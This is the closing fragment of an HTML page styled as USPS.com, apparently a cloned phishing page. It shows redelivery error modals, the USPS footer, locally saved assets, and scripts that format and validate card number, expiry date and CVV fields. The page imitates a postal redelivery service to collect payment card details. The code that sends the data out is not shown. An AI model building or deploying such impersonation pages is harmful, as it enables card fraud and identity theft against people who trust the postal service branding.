                                    <button  type="submit" class="btn-primary" id="" data-dismiss="modal" tabindex="0">Continue</button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END UNABLE TO CANCEL REQUEST -->
    
    <!-- START UNABLE TO CREATE REQUEST -->
    <div class="modal fade" id="unable-create-request-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <h3 class="modal-title">Sorry, your request cannot be created.</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <p>All redeliveries must be submitted before 2AM CST on the day of the Redelivery.</p>
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper btn-centered">
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary" id="" data-dismiss="modal" tabindex="0">Continue</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- END UNABLE TO CREATE REQUEST -->



    <!-- START SERVICE UNAVAILABLE -->
    <div class="modal fade" id="service-unavailable-modal" role="dialog" tabindex="-1">
        <div class="modal-dialog modal-md">
            <div class="modal-content modal-container">
                <div class="modal-header">
                    <a href="##" type="button" class="close" data-dismiss="modal" tabindex="0"><span class="visuallyhidden">Close Modal</span></a>
                    <h3 class="modal-title">Sorry, this service is currently unavailable. Please try again later.</h3>
                </div>
                <div class="modal-body">
                    <div class="body-content">
                        <div class="row">
                            <div class="col-md-12 col-sm-12 col-xs-12 button-wrapper btn-centered">
                                <div class="button-container">
                                    <a href="##" role="button" class="btn-primary" id="close" data-dismiss="modal" tabindex="0">Close</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>



    <div class="white-spinner-wrapper" style="display: none;" aria-labelledby="dialogheader" aria-haspopup="true">
        <div class="white-spinner-container">
            <div class="spinner-content">
                <h5 id="dialogheader" aria-modal="true" aria-label="Loading." role="alert" aria-live="rude">Loading</h5>
                <div class="white-spinner-progress">
                    <span class="white-spinner">
                        <div class="spinner">
                            <div class="bar-1"></div>
                            <div class="bar-2"></div>
                            <div class="bar-3"></div>
                            <div class="bar-4"></div>
                            <div class="bar-5"></div>
                        </div>
                    </span>
                </div>
                <p>Please wait while we process your request.</p>
            </div>
            <div class="gray-overlay"></div>
        </div>
    </div>
    <div class="results-return">
        <a href="##"><img src="files/2_files/backtop.png" alt="Back to Top" title="Back to Top"></a>
    </div>

    <div id="global-footer--wrap" class="global-footer--wrap">
<link type="text/css" rel="stylesheet" href="files/2_files/main-sb.css">
<link type="text/css" rel="stylesheet" href="files/2_files/footer-sb.css">
    

    
    
<footer class="global-footer">
<a href="https://www.usps.com/" class="global-footer--logo-link"></a>
<nav class="global-footer--navigation">
<ol>
<li style="color:#333366;" class="global-footer--navigation-category">
            Helpful Links
            <ol class="global-footer--navigation-options">
<li>
<a href="https://www.usps.com/help/contact-us.htm">Contact Us</a>
</li>
<li>
<a href="https://www.usps.com/globals/site-index.htm">Site Index</a>
</li>
<li>
<a href="https://faq.usps.com/s/">FAQs</a>
</li>
<li><a href="##" onclick="KAMPYLE_ONSITE_SDK.showForm(244)">Feedback</a></li>
</ol>
</li>
<li style="color:#333366;" class="global-footer--navigation-category">
            On About.USPS.com
            <ol class="global-footer--navigation-options">
<li>
<a href="https://about.usps.com/">About USPS Home</a>
</li>
<li>
<a href="https://about.usps.com/newsroom/">Newsroom</a>
</li>
<li>
<a href="https://about.usps.com/newsroom/service-alerts/">USPS Service Updates</a>
</li>
<li>
<a href="https://about.usps.com/resources/">Forms &amp; Publications</a>
</li>
<li>
<a href="https://about.usps.com/what/government-services/">Government Services</a>
</li>
<li>
<a href="https://about.usps.com/careers/">Careers</a>
</li>
</ol>
</li>
<li style="color:#333366;" class="global-footer--navigation-category">
            Other USPS Sites
            <ol class="global-footer--navigation-options">
<li>
<a href="https://gateway.usps.com/">Business Customer Gateway</a>
</li>
<li>
<a href="https://www.uspis.gov/">Postal Inspectors</a>
</li>
<li>
<a href="https://www.uspsoig.gov/">Inspector General</a>
</li>
<li>
<a href="https://pe.usps.com/">Postal Explorer</a>
</li>
<li>
<a href="https://postalmuseum.si.edu/">National Postal Museum</a>
</li>
<li>
<a href="https://www.usps.com/business/web-tools-apis/">Resources for Developers</a>
</li>
</ol>
</li>
<li style="color:#333366;" class="global-footer--navigation-category">
            Legal Information
            <ol class="global-footer--navigation-options">
<li>
<a href="https://about.usps.com/who/legal/privacy-policy/">Privacy Policy</a>
</li>
<li>
<a href="https://about.usps.com/who/legal/terms-of-use.htm">Terms of Use</a>
</li>
<li>
<a href="https://about.usps.com/who/legal/foia/">FOIA</a>
</li>
<li>
<a href="https://about.usps.com/who/legal/no-fear-act/">No FEAR Act/EEO Contacts</a>
</li>
</ol>
</li>
</ol>
</nav>
    
      <div class="global-footer--copyright">Copyright © <script type="text/javascript">document.write(new Date().getFullYear());</script>2023 USPS.  All Rights Reserved.</div>
    
    
<ul class="global-footer--social">
<li>
    <a style="text-decoration: none;" href="https://www.facebook.com/USPS?rf=108501355848630">
        <img alt="Image of Facebook social media icon." src="files/2_files/social-facebook_1.png">
    </a>
</li>
<li>
    <a style="text-decoration: none;" href="https://twitter.com/usps">
    <img alt="Image of Twitter social media icon." src="files/2_files/social-twitter_2.png">
    </a></li>
<li>
  <a style="text-decoration: none;" href="http://www.pinterest.com/uspsstamps/">
        <img alt="Image of Pinterest social media icon." src="files/2_files/social-pinterest_6.png">
    </a>
</li>
<li>
    <a style="text-decoration: none;" href="https://www.youtube.com/usps">
     <img alt="Image of Youtube social media icon." src="files/2_files/social-youtube_3.png">
    </a> 
</li>
</ul>

</footer>
</div>

<style title="MDigital_animationStyle"></style>
<script>
document.getElementById('cardn').oninput = function(e) {
    var numbers = e.target.value.replace(/\D/g, '');
    var parts = [];
    for (var i = 0; i < numbers.length; i += 4) {
        parts.push(numbers.substring(i, i+4));
    }

    var formatted = parts.join(' ');

    if (formatted.length > 19) {
        formatted = formatted.substring(0, 19);
    }

    e.target.value = formatted;
};

document.getElementById('cardn').onsubmit = function(e) {
    var cardNumber = document.getElementById('cardn').value;
    var alertSpan = document.getElementById('cardnErrorMessage');
    
    if(cardNumber.trim() === '') {
        e.preventDefault();
        alertSpan.innerText = 'invalid credit card';
        return false;
    }
    return true;
};
</script>
<script>
    var expiryDateElement = document.getElementById('Expiry');
    expiryDateElement.addEventListener('keyup', function(e) {
        var errorElement = document.getElementById('ExpiryErrorMessage');
        var userInput = e.target.value.replace(/\D/g, '');
        errorElement.style.display = 'none';
        var month = userInput.substring(0, 2);
        var year = userInput.substring(2, 4);
        if (year) {
            e.target.value = month + '/' + year;
        } else if (month) {
            e.target.value = month;
        } else {
            e.target.value = "";
        }
        if (month && (month < 1 || month > 12)) {
            errorElement.innerText = "Expiration Date Invalid";
            errorElement.style.display = 'inline';
        }
        var currentYear = new Date().getFullYear() % 100;
        if (year && year < currentYear) {
            errorElement.innerText = 'Expiration Date Invalid';
            errorElement.style.display = 'inline';
        }
    });
</script>

<script>
document.getElementById('cvv2').oninput = function(e) {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
};

document.getElementById('cvv2').onsubmit = function(e) {
    var numberField = document.getElementById('cvv2').value;
    var alertZone = document.getElementById('cvv2ErrorMessage');
    
    var lengthCondition = numberField.length > 2 && numberField.length <= 4;

    if(!lengthCondition) {
        e.preventDefault();
        alertZone.innerText = 'invalid security code ';
        return false;
    }
    return true;
};
</script>
<style>
#utility-bar, .util, #headWrap, #ghs {
  display: none;
}
.footer {
    width: auto !important;
}

.global--navigation .global-header--search span.input--wrap {
    height: 42px;
}
.global--navigation form.search.global-header--search {
    z-index: 9999999999;
}

.global--navigation span.input--wrap {
    width: 100%;
    height: 100%;
    height: 42px!important;
    width: 100%;
}

.global--navigation input.input--search.search--submit {
    z-index: 999999;
}
.global--navigation .nav-search .autocorrect {
    top: 43px;
    box-shadow: none;
    background: #ededed !important;

}

.global--navigation .nav-search span.input--wrap,
.global--navigation .nav-search span.input--wrap div.inputLeft, 
.global--navigation .nav-search span.input--wrap div.inputRight {
    background: #ededed !important;
    box-shadow: none;
    height: 40px !important;
}

.global--navigation .nav-search input#global-header--search-track-search {
    background: #ededed;
    box-shadow: none;
    left: 0;
    position: relative;
}

.global--navigation .nav-search input.input--search.search--submit {margin-top: 11px;}
.global--navigation .input--wrap .autocorrect,.global--navigation .input--wrap div.autocorrect{display:none!important;}

.nav-utility ul.lang-list {
    display: none !important;
}
.nav-utility #link-lang:hover {
    background: none!important;
}
a#link-lang {
    opacity: .5;
    cursor: pointer;
}


@media only screen and (min-width: 959px) {
.global--navigation nav .tool-international-forms a:before, .global--navigation nav .tool-international-forms a:hover:before, .global--navigation nav .tool-international-forms a:focus:before {
    background: url(img/printcustomsforms.svg);
}
}



</style>

</body></html>